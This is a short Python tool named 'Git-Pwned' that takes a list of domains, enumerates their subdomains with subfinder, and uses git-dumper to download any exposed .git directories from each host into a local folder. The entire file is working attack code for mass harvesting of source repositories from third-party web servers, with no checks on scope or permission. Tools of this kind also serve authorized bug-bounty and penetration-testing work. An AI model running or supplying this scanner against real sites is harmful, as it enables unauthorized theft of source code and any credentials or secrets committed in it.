#!/usr/bin/env python3
import argparse
import os
import os.path
import tldextract
import subprocess
from pyfiglet import Figlet
fetch_git = __import__('git-dumper').fetch_git

def clean_domain_list(file_location):
    lines = [line.rstrip('\n') for line in open(file_location)]
    parsed = []
    for line in lines :
        # Gets the hostname out of Urls
        extract = tldextract.extract(line)
        parsed.append(extract.domain+'.'+extract.suffix)
    return parsed

def find_subdomains(domains_list):
    subdomains = []
    for domain in domains_list:
        print('[+] Finding subdomains of '+domain)

        # Subfinder is required here as a command line utility
        output = subprocess.run(["sf", "-silent", "-d",domain], stdout=subprocess.PIPE).stdout.decode('utf-8')
        print ("[+] Domains Found :")
        print (output)
        sub_list = list(filter(None, output.split('\n')))
        for domain in sub_list:
            if(domain[0]=='.'):
                subdomains.append(domain[1:])
            else:
                subdomains.append(domain)
    return subdomains

def dump(domains_list,output_directory):
    for domain in domains_list:
        print ("\n[+] Testing : "+domain)
        try:
            fetch_git('http://'+domain+'/.git',output_directory+'/'+domain,10,3,3)
        except:
            print('is not Vulnerable/Reachable.')
        try:
            fetch_git('https://'+domain+'/.git',output_directory+'/'+domain,10,3,3)
        except:
            print('is not Vulnerable/Reachable.')
            continue

if __name__ == '__main__':
    # Banner
    CRED = '\033[91m'
    CEND = '\033[0m'
    custom_fig = Figlet(font='graffiti')
    print(CRED+custom_fig.renderText('Git-Pwned')+CEND)
    print('\t\t\t\t\t\t    - By CaptainFreak\n')

    # Argument Parsing
    parser = argparse.ArgumentParser(usage='%(prog)s [options] DOMAINS DIR',
                                     description='Hunt for exposed git repositiores on domains')
    parser.add_argument('domains', metavar='DOMAINS',
                        help='domains file')
    parser.add_argument('directory', metavar='DIR',
                        help='output directory')
    args = parser.parse_args()

    # clean domain list
    domains_list = clean_domain_list(args.domains)

    # find all subdomains
    subdomains_list = find_subdomains(domains_list)

    # If exposed, dump the repositories
    dump(subdomains_list,args.directory)
